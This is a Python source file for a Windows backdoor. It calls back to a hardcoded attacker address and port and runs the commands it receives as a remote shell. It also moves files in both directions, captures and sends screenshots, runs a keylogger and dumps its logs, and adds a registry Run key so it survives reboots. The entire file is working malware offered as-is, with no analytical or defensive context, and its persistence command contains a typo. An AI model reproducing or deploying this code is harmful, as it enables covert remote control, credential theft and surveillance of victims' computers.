import json
import socket
import os
import pyautogui
import keylogger
import threading
import shutil
import subprocess
import sys
import time

ipKali = '172.25.136.45'
port = 6969

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(filename):
    f = open(filename, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(filename):
    f = open(filename, 'rb')
    s.send(f.read())

def screenshot():
    myss = pyautogui.screenshot()
    myss.save('screen.png')

def presist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reeg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exist')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')


def shell():
    while True:
        command = reliable_recv()
        if command.lower() == 'quit' or command.lower() == 'exit':
            break
        elif command.lower() == 'screen shot' or command.lower() == 'ss':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command.lower() == 'help':
            pass
        elif command.lower()[:6] == 'persis' or command.lower()[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            presist(reg_name, copy_name)

        elif command.lower() == 'clear':
            pass
        elif command.lower() == 'keylog start' or command.lower() == 'kl start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keyloggr Started...')
        elif command.lower() == 'keylog dump' or command.lower() == 'kl dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command.lower() == 'keylog stop' or command.lower() == 'kl stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[-] Keylogger Stopped...')
        elif command.lower()[:8] == 'download':
            upload_file(command[9:])
        elif command.lower()[:6] == 'upload':
            download_file(command[7:])
        elif command.lower()[:3] == 'cd ':
            os.chdir(command[3:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect((ipKali, port))
            shell()
            s.close()
            break
        except:
            connection()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()



